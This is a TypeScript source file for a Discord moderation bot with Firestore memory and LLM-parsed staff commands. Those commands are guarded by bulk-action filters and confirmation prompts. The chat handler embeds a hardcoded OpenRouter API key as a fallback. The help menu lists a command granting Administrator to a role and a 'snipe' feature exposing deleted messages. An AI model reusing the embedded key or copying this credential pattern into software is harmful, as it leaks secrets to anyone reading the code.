/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { Client, GatewayIntentBits, EmbedBuilder, ActivityType, PermissionsBitField, TextChannel, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } from 'discord.js';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, doc, setDoc, deleteDoc, getDocs, getDoc } from 'firebase/firestore';
import fs from 'fs';
import { resolve } from 'path';
import dotenv from 'dotenv';
import http from 'http';

dotenv.config();

// Load Firebase configuration
let firestoreDb: any = null;
let isFirebaseReady = false;

try {
  const configPath = resolve(process.cwd(), 'firebase-applet-config.json');
  if (fs.existsSync(configPath)) {
    const raw = fs.readFileSync(configPath, 'utf-8');
    const cfg = JSON.parse(raw);
    const firebaseApp = initializeApp(cfg);
    firestoreDb = cfg.firestoreDatabaseId 
      ? getFirestore(firebaseApp, cfg.firestoreDatabaseId)
      : getFirestore(firebaseApp);
    isFirebaseReady = true;
    console.log('✅ Connected to Firebase Firestore database.');
  }
} catch (err: any) {
  console.warn('Firebase init notice:', err.message);
}

// Bot state
let botBio = "Official Yama Moderation Bot guarding server security.";
let botCustomStatus = "Guarding the server with Yama Moderation | ?yamastrike & ?yamabeam";
const afkUsers = new Map<string, { reason: string; timestamp: number; username?: string }>();

interface DeletedMessageInfo {
  id: string;
  channelId: string;
  userId: string;
  username: string;
  avatar: string;
  content: string;
  deletedAt: number;
}
const lastChannelDeletedMessages = new Map<string, DeletedMessageInfo>();
const userDeletedMessages = new Map<string, DeletedMessageInfo>();

// Load AFK users & profile
async function loadAfkUsersFromFirestore() {
  if (!firestoreDb) return;
  try {
    const colRef = collection(firestoreDb, 'afk_users');
    const snapshot = await getDocs(colRef);
    snapshot.forEach(docSnap => {
      const data = docSnap.data();
      if (data?.userId && data?.reason) {
        afkUsers.set(data.userId, {
          reason: data.reason,
          timestamp: data.updatedAt || Date.now(),
          username: data.username
        });
      }
    });

    const profileSnap = await getDoc(doc(firestoreDb, 'bot_config', 'profile'));
    if (profileSnap.exists()) {
      const data = profileSnap.data();
      if (data?.bio) botBio = data.bio;
      if (data?.customStatus) botCustomStatus = data.customStatus;
    }
    console.log(`✅ Loaded ${afkUsers.size} AFK users and bot profile from Firestore.`);
  } catch (err: any) {
    console.warn('Firestore load warning:', err.message);
  }
}


// Health server so Render detects an open port
const PORT = Number(process.env.PORT) || 10000;
http
  .createServer((_req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running');
  })
  .listen(PORT, '0.0.0.0', () => console.log(`🌐 Health server on port ${PORT}`));

// Bot client setup
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

client.once('clientReady', async () => {
  console.log(`🤖 Logged in as ${client.user?.tag}!`);
  await loadAfkUsersFromFirestore();
  if (client.user && botCustomStatus) {
    client.user.setPresence({
      activities: [{ name: botCustomStatus, type: ActivityType.Custom }]
    });
  }

  // Register slash commands
  try {
    await client.application?.commands.set([
      { name: 'ping', description: 'Check bot latency and Discord gateway speed' },
      { name: 'sync', description: 'Synchronize commands & refresh Firestore cache' },
      { name: 'help', description: 'View staff command guide (Sent to DMs)' }
    ]);
    console.log('✅ Registered slash commands (/ping, /sync, /help)');
  } catch (err: any) {
    console.warn('Slash command registration warning:', err.message);
  }
});

// Cache deleted messages for ?snipe
client.on('messageDelete', async (delMsg) => {
  try {
    if (!delMsg || !delMsg.channel || !delMsg.author || delMsg.author.bot) return;
    if (!delMsg.content) return;

    const deletedInfo: DeletedMessageInfo = {
      id: delMsg.id,
      channelId: delMsg.channel.id,
      userId: delMsg.author.id,
      username: delMsg.author.tag,
      avatar: delMsg.author.displayAvatarURL?.() || '',
      content: delMsg.content,
      deletedAt: Date.now()
    };

    lastChannelDeletedMessages.set(delMsg.channel.id, deletedInfo);
    userDeletedMessages.set(`${delMsg.channel.id}:${delMsg.author.id}`, deletedInfo);
  } catch (e) {
    // ignore
  }
});

// ─────────────────────────────────────────────────────────────
// AI STAFF ACTIONS
// The AI only picks the action type + details. Targets (users / roles /
// channels) are resolved by CODE from real mentions or the replied-to
// message, so the AI can never invent or swap a target.
// ─────────────────────────────────────────────────────────────
const MAIN_STAFF_ID = '1521870728079737053'; // pinged (with the server owner) when a bulk action is refused
const STAFF_ACTION_GATE = /\b(ban|unban|kick|mute|unmute|timeout|time out|warn|strike|role|colou?r|channel|rename|nickname|nick|create|make|delete|remove|give|assign)\b/i;
const DESTRUCTIVE = '(?:delete|remove|ban|kick|purge|wipe|nuke|clear|mute|timeout|destroy|kill)';
const BULK_A = new RegExp(`\\b${DESTRUCTIVE}\\b\\s+(?:\\S+\\s+){0,2}(?:(?:all|every|everyone|everybody|everything|each|entire|whole)\\b|@everyone|@here)`, 'i');
const BULK_B = /\b(nuke|wipe|purge|mass[\s-]?\w+|bulk)\b/i;
const CONFIRM_ACTIONS = new Set(['ban', 'unban', 'kick', 'delete_channel', 'delete_role']);
const DANGEROUS_ROLE_PERMS = [
  PermissionsBitField.Flags.Administrator,
  PermissionsBitField.Flags.ManageGuild,
  PermissionsBitField.Flags.ManageRoles,
  PermissionsBitField.Flags.ManageChannels,
  PermissionsBitField.Flags.BanMembers,
  PermissionsBitField.Flags.KickMembers,
  PermissionsBitField.Flags.ModerateMembers,
  PermissionsBitField.Flags.ManageMessages,
  PermissionsBitField.Flags.ManageWebhooks,
  PermissionsBitField.Flags.MentionEveryone
];
const ALLOWED_ACTIONS = new Set([
  'ban', 'unban', 'kick', 'mute', 'unmute', 'warn', 'set_nickname',
  'create_role', 'edit_role', 'give_role', 'remove_role', 'delete_role',
  'create_channel', 'rename_channel', 'delete_channel'
]);

function isBulkRequest(text: string): boolean {
  return BULK_A.test(text) || BULK_B.test(text);
}

async function refuseBulk(message: any, text: string) {
  const ownerId = message.guild.ownerId;
  const ping = [`<@${MAIN_STAFF_ID}>`, ownerId !== MAIN_STAFF_ID ? `<@${ownerId}>` : ''].filter(Boolean).join(' ');
  const quoted = text.replace(/`/g, "'").substring(0, 200);
  await message.reply({
    content: `🚫 ${ping} — <@${message.author.id}> asked me for a **bulk / mass action**. I don't do those, so **nothing was changed**.\nRequest: \`${quoted}\``,
    allowedMentions: { parse: [], users: [MAIN_STAFF_ID, ownerId] }
  }).catch(() => {});
}

async function parseStaffIntent(maskedText: string): Promise<any | null> {
  const apiKey = process.env.OPENROUTER_API_KEY;
  if (!apiKey) return null;
  const system = `You convert a Discord staff message into ONE JSON command. Output ONLY raw JSON, no markdown.
Schema: {"intent":"action"|"none","action":string|null,"reason":string|null,"duration":string|null,"role_name":string|null,"color":string|null,"new_name":string|null,"channel_name":string|null,"multiple_actions":boolean,"bulk":boolean}
Allowed actions: ban, unban, kick, mute, unmute, warn, set_nickname, create_role, edit_role, give_role, remove_role, delete_role, create_channel, rename_channel, delete_channel.
Rules:
- [USER], [ROLE], [CHANNEL] are placeholders for mentioned things. Never output IDs or invent targets.
- intent="none" for casual chat, questions, or anything that is not a server command.
- mute = timeout. duration like "10m", "1h", "2d" (null if not given).
- color must be a #RRGGBB hex (convert color names to hex).
- role_name = the existing/new role's name if given in words. channel_name likewise. new_name = new name / nickname.
- reason = the reason if given, else null.
- multiple_actions=true if the staff asked for more than one different action.
- bulk=true if the request affects all/many/everyone/everything (all channels, all roles, all messages, all members, etc).`;
  try {
    const res = await fetch('https://openrouter.ai/api/v1/chat/completions', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'poolside/laguna-s-2.1',
        temperature: 0,
        messages: [{ role: 'system', content: system }, { role: 'user', content: maskedText }]
      })
    });
    const data: any = await res.json();
    const raw: string = data?.choices?.[0]?.message?.content || '';
    const m = raw.match(/\{[\s\S]*\}/);
    return m ? JSON.parse(m[0]) : null;
  } catch (e) {
    return null;
  }
}

async function confirmWithStaff(message: any, text: string): Promise<boolean> {
  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder().setCustomId('ai_confirm').setLabel('Confirm').setStyle(ButtonStyle.Danger),
    new ButtonBuilder().setCustomId('ai_cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
  );
  const prompt: any = await message.reply({ content: text, components: [row], allowedMentions: { parse: [] } }).catch(() => null);
  if (!prompt) return false;
  try {
    const i: any = await prompt.awaitMessageComponent({
      componentType: ComponentType.Button,
      time: 30000,
      filter: (x: any) => x.user.id === message.author.id
    });
    const ok = i.customId === 'ai_confirm';
    await i.update({ content: ok ? `${text}\n\n✅ Confirmed.` : `${text}\n\n❎ Cancelled. Nothing was changed.`, components: [] }).catch(() => {});
    return ok;
  } catch (e) {
    await prompt.edit({ content: `${text}\n\n⌛ Timed out. Nothing was changed.`, components: [] }).catch(() => {});
    return false;
  }
}

// Returns true if the message was handled (so normal AI chat is skipped).
async function handleStaffAiAction(
  message: any,
  ctx: { isStaff: (id: string, member: any) => boolean; embedTitle: string; gifUrl: string; dmLogChannelId: string }
): Promise<boolean> {
  const guild = message.guild;
  const text: string = message.content;
  const reply = (content: string) => message.reply({ content, allowedMentions: { parse: [] } }).catch(() => {});

  // Layer 1: bulk wording is refused before the AI is even asked.
  if (isBulkRequest(text)) { await refuseBulk(message, text); return true; }

  // Resolve exact targets from real mentions (never from the AI).
  const botId = client.user!.id;
  const userIds = [...new Set([...text.matchAll(/<@!?(\d+)>/g)].map(m => m[1]))].filter(id => id !== botId && id !== message.author.id);
  const roleIds = [...new Set([...text.matchAll(/<@&(\d+)>/g)].map(m => m[1]))];
  const channelIds = [...new Set([...text.matchAll(/<#(\d+)>/g)].map(m => m[1]))];

  let repliedAuthorId: string | null = null;
  if (userIds.length === 0 && message.reference?.messageId) {
    try {
      const replied = await message.channel.messages.fetch(message.reference.messageId);
      if (!replied.author.bot) repliedAuthorId = replied.author.id;
    } catch (e) {}
  }
  const targetIds = userIds.length > 0 ? userIds : (repliedAuthorId ? [repliedAuthorId] : []);

  const masked = text
    .replace(/<@!?\d+>/g, '[USER]')
    .replace(/<@&\d+>/g, '[ROLE]')
    .replace(/<#\d+>/g, '[CHANNEL]')
    .trim();
  const intent = await parseStaffIntent(masked);
  if (!intent || intent.intent !== 'action' || !intent.action) return false; // normal chat

  const action = String(intent.action);
  if (!ALLOWED_ACTIONS.has(action)) {
    await reply(`⚠️ I can't do \`${action.substring(0, 40)}\`. Nothing was changed.`);
    return true;
  }

  // Layer 2: the AI's own bulk / multi-action flags.
  if (intent.bulk === true) { await refuseBulk(message, text); return true; }
  if (intent.multiple_actions === true) {
    await reply('⚠️ One action at a time please. Nothing was changed.');
    return true;
  }

  const reason = String(intent.reason || 'No reason provided').substring(0, 400);
  const auditReason = `${message.author.tag} (via AI): ${reason}`.substring(0, 480);

  // ── Member actions ──
  const memberActions = new Set(['ban', 'unban', 'kick', 'mute', 'unmute', 'warn', 'set_nickname', 'give_role', 'remove_role']);
  let target: any = null;

  if (memberActions.has(action)) {
    // Layer 3: more than one target = bulk.
    if (targetIds.length > 1) { await refuseBulk(message, text); return true; }

    if (action === 'unban') {
      const idMatch = text.match(/\b(\d{17,20})\b/);
      if (!idMatch) { await reply('⚠️ To unban, give me the exact user ID. Nothing was changed.'); return true; }
      const id = idMatch[1];
      const ok = await confirmWithStaff(message, `⚠️ Unban user ID \`${id}\`?\nReason: ${reason}`);
      if (!ok) return true;
      try {
        await guild.members.unban(id, auditReason);
        await reply(`✅ Unbanned user ID \`${id}\`.`);
      } catch (e: any) { await reply(`❌ Couldn't unban: ${e.message}`); }
      return true;
    }

    if (targetIds.length === 0) {
      await reply('⚠️ Who? Mention the user (or reply to their message and mention me). Nothing was changed.');
      return true;
    }
    const targetId = targetIds[0];

    // ban works even if they left; everything else needs them in the server
    try { target = await guild.members.fetch(targetId); } catch (e) { target = null; }
    if (!target && action !== 'ban') { await reply('⚠️ That user is not in this server. Nothing was changed.'); return true; }

    // Safety: never touch the bot, the owner, staff or yourself.
    if (targetId === botId || targetId === guild.ownerId || ctx.isStaff(targetId, target)) {
      await reply('🛡️ I won\'t do that to the owner, the bot, or staff. Nothing was changed.');
      return true;
    }
  }

  const label = target ? `${target.user.tag} (\`${target.id}\`)` : `ID \`${targetIds[0]}\``;

  if (CONFIRM_ACTIONS.has(action) && action !== 'unban' && action !== 'delete_channel' && action !== 'delete_role') {
    const ok = await confirmWithStaff(message, `⚠️ **${action.toUpperCase()}** → ${label}\nReason: ${reason}\n\nThis is the exact user. Confirm?`);
    if (!ok) return true;
  }

  try {
    switch (action) {
      case 'ban': {
        if (target && !target.bannable) { await reply('❌ I can\'t ban them (their role is above mine or equal). Nothing was changed.'); return true; }
        // deleteMessageSeconds: 0 → banning never wipes their message history
        await guild.members.ban(targetIds[0], { reason: auditReason, deleteMessageSeconds: 0 });
        await reply(`🔨 Banned ${label}.\nReason: ${reason}`);
        return true;
      }
      case 'kick': {
        if (!target.kickable) { await reply('❌ I can\'t kick them (their role is above mine or equal). Nothing was changed.'); return true; }
        await target.kick(auditReason);
        await reply(`👢 Kicked ${label}.\nReason: ${reason}`);
        return true;
      }
      case 'mute': {
        if (!target.moderatable) { await reply('❌ I can\'t mute them (role hierarchy). Nothing was changed.'); return true; }
        let duration = String(intent.duration || '1h');
        let m = duration.match(/^(\d+)([smhd])$/i);
        if (!m) { duration = '1h'; m = duration.match(/^(\d+)([smhd])$/i); }
        const v = parseInt(m![1], 10);
        const unit = m![2].toLowerCase();
        let ms = unit === 's' ? v * 1000 : unit === 'm' ? v * 60000 : unit === 'h' ? v * 3600000 : v * 86400000;
        const max = 28 * 86400000;
        if (ms > max) { ms = max; duration = '28d'; }
        if (ms < 1000) { ms = 60000; duration = '1m'; }
        await target.timeout(ms, auditReason);
        await reply(`🔇 Muted ${label} for **${duration}**.\nReason: ${reason}`);
        return true;
      }
      case 'unmute': {
        if (!target.moderatable) { await reply('❌ I can\'t change their timeout (role hierarchy). Nothing was changed.'); return true; }
        await target.timeout(null, auditReason);
        await reply(`🔊 Unmuted ${label}.`);
        return true;
      }
      case 'warn': {
        const embed = new EmbedBuilder()
          .setTitle(ctx.embedTitle)
          .setColor(0xF59E0B)
          .addFields(
            { name: '👤 Target', value: `<@${target.id}> (${target.user.tag})`, inline: true },
            { name: '🛡️ Action', value: 'Warn / Strike', inline: true },
            { name: '👮 Issued By', value: `<@${message.author.id}>`, inline: true },
            { name: '📝 Reason', value: reason, inline: false }
          )
          .setImage(ctx.gifUrl)
          .setTimestamp();
        await message.reply({ embeds: [embed], allowedMentions: { parse: [] } }).catch(() => {});
        try {
          const logChannel = await client.channels.fetch(ctx.dmLogChannelId);
          if (logChannel && logChannel.isTextBased()) {
            await (logChannel as TextChannel).send({
              content: `📋 **[STRIKE LOG]** User <@${target.id}> warned by <@${message.author.id}> (via AI).\n**Reason:** ${reason}`,
              embeds: [embed],
              allowedMentions: { parse: [] }
            });
          }
        } catch (e) {}
        return true;
      }
      case 'set_nickname': {
        if (!target.manageable) { await reply('❌ I can\'t change their nickname (role hierarchy). Nothing was changed.'); return true; }
        const nick = intent.new_name ? String(intent.new_name).replace(/@/g, '').substring(0, 32) : null;
        await target.setNickname(nick, auditReason);
        await reply(nick ? `✏️ Set ${label}'s nickname to **${nick}**.` : `✏️ Reset ${label}'s nickname.`);
        return true;
      }
    }

    // ── Role / channel actions ──
    const resolveRole = async (): Promise<any | null> => {
      if (roleIds.length > 1 && action !== 'give_role') return 'many';
      if (roleIds.length > 1) return 'many';
      if (roleIds.length === 1) return guild.roles.cache.get(roleIds[0]) || (await guild.roles.fetch(roleIds[0]).catch(() => null));
      if (intent.role_name) {
        const nm = String(intent.role_name).toLowerCase();
        const found = guild.roles.cache.filter((r: any) => r.name.toLowerCase() === nm && r.id !== guild.id);
        if (found.size === 1) return found.first();
        if (found.size > 1) return 'many';
      }
      return null;
    };
    const resolveChannel = async (): Promise<any | null> => {
      if (channelIds.length > 1) return 'many';
      if (channelIds.length === 1) return guild.channels.cache.get(channelIds[0]) || (await guild.channels.fetch(channelIds[0]).catch(() => null));
      if (intent.channel_name) {
        const nm = String(intent.channel_name).toLowerCase().replace(/^#/, '');
        const found = guild.channels.cache.filter((c: any) => c.name.toLowerCase() === nm);
        if (found.size === 1) return found.first();
        if (found.size > 1) return 'many';
      }
      return null;
    };
    const cleanName = (n: string, channel = false) => {
      let s = String(n || '').replace(/@/g, '').trim();
      if (channel) s = s.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9\-_]/g, '');
      return s.substring(0, 100);
    };
    const validColor = (c: any) => (typeof c === 'string' && /^#[0-9a-f]{6}$/i.test(c.trim())) ? c.trim() : null;

    switch (action) {
      case 'create_role': {
        const name = cleanName(intent.role_name || intent.new_name);
        if (!name) { await reply('⚠️ What should the role be called? Nothing was changed.'); return true; }
        const color = validColor(intent.color);
        // Roles made by the AI never get any permissions.
        const role = await guild.roles.create({ name, color: color || undefined, permissions: [], reason: auditReason });
        await reply(`✅ Created role **${role.name}**${color ? ` with color \`${color}\`` : ''} (no permissions).`);
        return true;
      }
      case 'edit_role': {
        const role = await resolveRole();
        if (role === 'many') { await reply('⚠️ More than one role matched. Mention the exact role. Nothing was changed.'); return true; }
        if (!role) { await reply('⚠️ Which role? Mention it. Nothing was changed.'); return true; }
        if (role.id === guild.id || role.managed || !role.editable) { await reply('❌ I can\'t edit that role. Nothing was changed.'); return true; }
        const color = validColor(intent.color);
        const newName = intent.new_name ? cleanName(intent.new_name) : null;
        if (!color && !newName) { await reply('⚠️ Tell me the new color or name. Nothing was changed.'); return true; }
        await role.edit({ ...(color ? { color } : {}), ...(newName ? { name: newName } : {}), reason: auditReason });
        await reply(`✅ Updated role **${role.name}**${color ? ` → color \`${color}\`` : ''}${newName ? ` → name **${newName}**` : ''}.`);
        return true;
      }
      case 'give_role':
      case 'remove_role': {
        const role = await resolveRole();
        if (role === 'many') { await reply('⚠️ More than one role matched. Mention exactly one role. Nothing was changed.'); return true; }
        if (!role) { await reply('⚠️ Which role? Mention it. Nothing was changed.'); return true; }
        if (role.id === guild.id || role.managed || !role.editable) { await reply('❌ I can\'t manage that role. Nothing was changed.'); return true; }
        if (DANGEROUS_ROLE_PERMS.some(p => role.permissions.has(p))) {
          await reply('🛡️ That role has powerful permissions, so I won\'t hand it out or remove it. Nothing was changed.');
          return true;
        }
        if (action === 'give_role') await target.roles.add(role, auditReason);
        else await target.roles.remove(role, auditReason);
        await reply(`✅ ${action === 'give_role' ? 'Gave' : 'Removed'} **${role.name}** ${action === 'give_role' ? 'to' : 'from'} ${label}.`);
        return true;
      }
      case 'delete_role': {
        const role = await resolveRole();
        if (role === 'many') { await reply('⚠️ More than one role matched. Mention exactly one role. Nothing was changed.'); return true; }
        if (!role) { await reply('⚠️ Which role? Mention it. Nothing was changed.'); return true; }
        if (role.id === guild.id || role.managed || !role.editable) { await reply('❌ I can\'t delete that role. Nothing was changed.'); return true; }
        if (ctx.isStaff('', { roles: { cache: { has: (id: string) => id === role.id } } })) {
          await reply('🛡️ That is the staff role. Nothing was changed.');
          return true;
        }
        const ok = await confirmWithStaff(message, `⚠️ **DELETE ROLE** → **${role.name}** (\`${role.id}\`)\nThis is the exact role. Confirm?`);
        if (!ok) return true;
        await role.delete(auditReason);
        await reply(`🗑️ Deleted role **${role.name}**.`);
        return true;
      }
      case 'create_channel': {
        const name = cleanName(intent.channel_name || intent.new_name, true);
        if (!name) { await reply('⚠️ What should the channel be called? Nothing was changed.'); return true; }
        const ch = await guild.channels.create({ name, reason: auditReason });
        await reply(`✅ Created channel <#${ch.id}>.`);
        return true;
      }
      case 'rename_channel': {
        const ch = await resolveChannel();
        if (ch === 'many') { await reply('⚠️ More than one channel matched. Mention exactly one. Nothing was changed.'); return true; }
        if (!ch) { await reply('⚠️ Which channel? Mention it. Nothing was changed.'); return true; }
        const name = cleanName(intent.new_name, true);
        if (!name) { await reply('⚠️ What\'s the new name? Nothing was changed.'); return true; }
        const old = ch.name;
        await ch.setName(name, auditReason);
        await reply(`✏️ Renamed \`#${old}\` → <#${ch.id}>.`);
        return true;
      }
      case 'delete_channel': {
        const ch = await resolveChannel();
        if (ch === 'many') { await reply('⚠️ More than one channel matched. Mention exactly one. Nothing was changed.'); return true; }
        if (!ch) { await reply('⚠️ Which channel? Mention it. Nothing was changed.'); return true; }
        const ok = await confirmWithStaff(message, `⚠️ **DELETE CHANNEL** → #${ch.name} (\`${ch.id}\`)\nThis is the exact channel. Confirm?`);
        if (!ok) return true;
        await ch.delete(auditReason);
        if (ch.id !== message.channel.id) await reply(`🗑️ Deleted channel #${ch.name}.`);
        return true;
      }
    }
  } catch (err: any) {
    await reply(`❌ That failed: ${err.message}. Nothing else was changed.`);
    return true;
  }
  return false;
}

// Message create handler
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  const prefix = '?';
  const allowedRoleId = '1555240171564302346';
  const allowedUserIds = ['1521870728079737053', '1005581180286025749'];
  const dmLogChannelId = '1521870728079737053';
  const gifUrl = 'https://cdn.imageurlgenerator.com/uploads/1365dbdf-db34-4d9a-913a-317a621db09b.gif';
  const embedTitle = "You're cooked buddy";

  const hasRole = message.member?.roles.cache.has(allowedRoleId);
  const isAllowedUser = allowedUserIds.includes(message.author.id);
  const isAuthorized = hasRole || isAllowedUser;

  // 1. AFK Return Check
  if (afkUsers.has(message.author.id) && !message.content.startsWith(`${prefix}afk`)) {
    afkUsers.delete(message.author.id);
    if (firestoreDb) {
      deleteDoc(doc(firestoreDb, 'afk_users', message.author.id)).catch(() => {});
    }
    message.reply(`👋 Welcome back <@${message.author.id}>, I have removed your AFK.`).catch(() => {});
  }

  // 2. AFK Mention Responder
  if (message.mentions.users.size > 0) {
    message.mentions.users.forEach((mentionedUser) => {
      if (mentionedUser.id !== message.author.id && afkUsers.has(mentionedUser.id)) {
        const afkInfo = afkUsers.get(mentionedUser.id);
        message.reply(`The User Is AFK : ${afkInfo?.reason}`).catch(() => {});
      }
    });
  }

  // AI Assistant handling
  const isBotMention = message.mentions.users.has(client.user!.id);
  let isReplyToBot = false;
  if (message.reference?.messageId) {
    try {
      const replied = await message.channel.messages.fetch(message.reference.messageId);
      if (replied.author.id === client.user?.id) isReplyToBot = true;
    } catch (e) {}
  }

  const trimmed = message.content.trim().toLowerCase();
  const isCommand = message.content.startsWith(prefix) || trimmed === 'y!help' || trimmed === '!help';

  if (!isCommand && (isBotMention || isReplyToBot)) {
    if (isAuthorized && STAFF_ACTION_GATE.test(message.content)) {
      const handled = await handleStaffAiAction(message, {
        isStaff: (id: string, member: any) => allowedUserIds.includes(id) || !!member?.roles?.cache?.has(allowedRoleId),
        embedTitle,
        gifUrl,
        dmLogChannelId
      });
      if (handled) return;
    }
    if (message.content.includes('@everyone') || message.content.includes('@here') || message.mentions.roles.size > 0) {
      return;
    }

    const cleanContent = message.content.replace(/<@!?\d+>/g, '').trim() || message.content;
    const lowerClean = cleanContent.toLowerCase();

    // Instant programmatic server shortcuts
    if (lowerClean.includes('server name') || lowerClean.includes('name of our server') || lowerClean.includes('what server')) {
      return message.reply(`The name of our server is **${message.guild.name}**! 🏢`).catch(() => {});
    }
    if (lowerClean.includes('how many member') || lowerClean.includes('member count') || lowerClean.includes('members count')) {
      return message.reply(`There are **${message.guild.memberCount}** members in **${message.guild.name}**! 👥`).catch(() => {});
    }
    if (lowerClean.includes('how many channel') || lowerClean.includes('channel count') || lowerClean.includes('list channel')) {
      const channelsList = message.guild.channels.cache.map(c => `#${c.name}`).slice(0, 20).join(', ');
      return message.reply(`There are **${message.guild.channels.cache.size}** channels in **${message.guild.name}**: ${channelsList} 📁`).catch(() => {});
    }

    // Call OpenRouter with database memory
    try {
      const memoryDocId = `${message.guild.id}_${message.author.id}`;
      let conversationHistory: Array<{ role: 'user' | 'assistant'; content: string }> = [];

      if (firestoreDb) {
        const memorySnap = await getDoc(doc(firestoreDb, 'ai_memory', memoryDocId));
        if (memorySnap.exists() && Array.isArray(memorySnap.data().messages)) {
          conversationHistory = memorySnap.data().messages;
        }
      }

      // Only share server info when the user explicitly asks about it
      const asksAboutServer = /\b(server|guild|member|members|channel|channels)\b/i.test(cleanContent);
      let serverInfo = '';
      if (asksAboutServer) {
        const memberCount = message.guild.memberCount;
        const channelCount = message.guild.channels.cache.size;
        const channelsList = message.guild.channels.cache.map(c => `#${c.name}`).slice(0, 30).join(', ');
        serverInfo = `\nThe user asked about the server. You may use this info:\n- Server Name: ${message.guild.name}\n- Total Members: ${memberCount}\n- Total Channels: ${channelCount}\n- Channels List: ${channelsList}`;
      }

      const systemMessage = {
        role: 'system',
        content: `You are Yama, a helpful, friendly, and concise AI assistant on Discord. You remember past conversation context with this user.\nNEVER mention or bring up the Discord server's name, member count, channels, or any other server details unless the user explicitly asks for them. If you have no server details, do not guess or invent them.${serverInfo}`
      };

      const apiMessages = [
        systemMessage,
        ...conversationHistory.map(m => ({ role: m.role, content: m.content })),
        { role: 'user', content: cleanContent }
      ];

      const apiKey = process.env.OPENROUTER_API_KEY || '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';
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'poolside/laguna-s-2.1',
          messages: apiMessages
        })
      });

      const data = await response.json();
      if (data.choices && data.choices[0]) {
        const aiResponse = data.choices[0].message.content
          .replace(/@everyone/g, '@\u200beveryone')
          .replace(/@here/g, '@\u200bhere');

        if (aiResponse.trim().length > 0) {
          conversationHistory.push({ role: 'user', content: cleanContent });
          conversationHistory.push({ role: 'assistant', content: aiResponse });
          if (conversationHistory.length > 20) conversationHistory = conversationHistory.slice(-20);

          if (firestoreDb) {
            setDoc(doc(firestoreDb, 'ai_memory', memoryDocId), {
              messages: conversationHistory,
              updatedAt: Date.now()
            }).catch(() => {});
          }

          message.reply(aiResponse.substring(0, 2000)).catch(() => {});
        }
      }
    } catch (e: any) {
      console.error('AI chat error:', e.message);
    }
    return;
  }

  // Command: y!help
  const isHelpCommand = trimmed === 'y!help' || trimmed === '!help' || trimmed === `${prefix}help`;
  if (isHelpCommand) {
    if (!isAuthorized) return; // Silent suppression for non-authorized

    const helpEmbed = new EmbedBuilder()
      .setTitle('⚡ Yama Bot Commands Guide')
      .setColor(0x6366F1)
      .addFields(
        {
          name: '🛡️ Moderation (Authorized Only)',
          value: [
            '• `?yamastrike @user {reason}` — Warn a user with GIF embed & DM log',
            '• `?yamabeam @user duration reason` — Timeout a user (e.g. 10m, 1h, 1d)',
            '• `?purge count` — Wipe messages (1-100)',
            '• `?dbm` — Delete all bot messages in this channel',
            '• `?admin <roleId>` — Grant Administrator permissions to role'
          ].join('\n')
        },
        {
          name: '📁 Channel Management (Authorized Only)',
          value: [
            '• `?createchannel <name>` — Create a new text channel',
            '• `?deletechannel #channel` — Delete specified channel',
            '• `?renamechannel #channel <name>` — Rename specified channel'
          ].join('\n')
        },
        {
          name: '💤 Utility & AFK (Everyone)',
          value: [
            '• `?afk [reason]` — Set AFK status (mentions trigger auto-reply)',
            '• `?snipe [@user]` — Reveal last deleted message',
            '• `?setbotbio <bio>` — Update bot bio description (Authorized)',
            '• `?setbotstatus <status>` — Update bot activity presence (Authorized)'
          ].join('\n')
        },
        {
          name: '⚡ System Commands',
          value: [
            '• `/ping` — Show bot & gateway latency',
            '• `/sync` — Refresh slash commands & cloud cache',
            '• `y!help` — Sends this guide to your DMs'
          ].join('\n')
        }
      )
      .setTimestamp();

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.react('📬').catch(() => {});
    } catch (e) {
      message.reply('❌ Please enable Direct Messages from server members to receive the help menu.').catch(() => {});
    }
    return;
  }

  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/\s+/);
  const command = args.shift()?.toLowerCase();

  // Utility commands
  if (command === 'ping') {
    const sent = await message.reply('🏓 Pinging...').catch(() => null);
    if (sent) {
      sent.edit(`🏓 **Pong!** Gateway: \`${client.ws.ping}ms\` | Latency: \`${sent.createdTimestamp - message.createdTimestamp}ms\``).catch(() => {});
    }
    return;
  }

  if (command === 'afk') {
    const reason = args.join(' ') || 'AFK';
    afkUsers.set(message.author.id, { reason, timestamp: Date.now(), username: message.author.tag });
    if (firestoreDb) {
      setDoc(doc(firestoreDb, 'afk_users', message.author.id), {
        userId: message.author.id,
        username: message.author.tag,
        reason,
        updatedAt: Date.now()
      }).catch(() => {});
    }
    return message.reply(`💤 <@${message.author.id}>, I have set your AFK: **${reason}**`).catch(() => {});
  }

  if (command === 'snipe') {
    const target = message.mentions.users.first();
    const snipedMsg = target 
      ? userDeletedMessages.get(`${message.channel.id}:${target.id}`)
      : lastChannelDeletedMessages.get(message.channel.id);

    if (!snipedMsg) {
      return message.reply('🔍 No recently deleted messages found in this channel.').catch(() => {});
    }

    const embed = new EmbedBuilder()
      .setTitle('🎯 Sniped Deleted Message')
      .setColor(0x6366F1)
      .setAuthor({ name: snipedMsg.username, iconURL: snipedMsg.avatar || undefined })
      .setDescription(`> ${snipedMsg.content}`)
      .addFields(
        { name: '👤 Author', value: `<@${snipedMsg.userId}>`, inline: true },
        { name: '🕒 Deleted At', value: `<t:${Math.floor(snipedMsg.deletedAt / 1000)}:R>`, inline: true }
      )
      .setTimestamp(snipedMsg.deletedAt);

    return message.reply({ embeds: [embed] }).catch(() => {});
  }

  // Commands requiring authorization
  if (!isAuthorized) {
    return message.reply('❌ You do not have permission to use staff commands.').catch(() => {});
  }

  if (command === 'createchannel') {
    const name = args.join('-');
    if (!name) return message.reply('⚠️ Usage: `?createchannel <name>`').catch(() => {});
